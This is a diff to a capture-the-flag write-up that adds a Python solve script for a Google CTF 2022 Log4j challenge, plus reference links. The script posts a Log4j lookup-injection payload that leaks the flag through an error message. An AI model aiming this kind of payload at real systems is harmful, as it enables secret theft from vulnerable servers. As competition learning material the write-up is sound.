@@ -44,3 +44,21 @@ while True:
 system('cat flag*')
 print()
 ```
+## Log4j
+```python
+import requests
+import re
+
+URL = "https://log4j-web.2022.ctfcompetition.com/"
+
+payload = "${java:${java:FLAG}}"
+r = requests.post(URL, data={"text": payload})
+output = re.search(r"(?<=to lookup java:).*(?=java.lang.IllegalArgumentException:)", r.text)
+print(output.group(0))
+```
+### Referensi
+#log4j
+- https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
+- https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell
+- https://github.com/FarhadAlimohammadi-dir/Google-CTF-2022-Writeups
+- https://www.youtube.com/watch?v=0-abhd-CLwQ
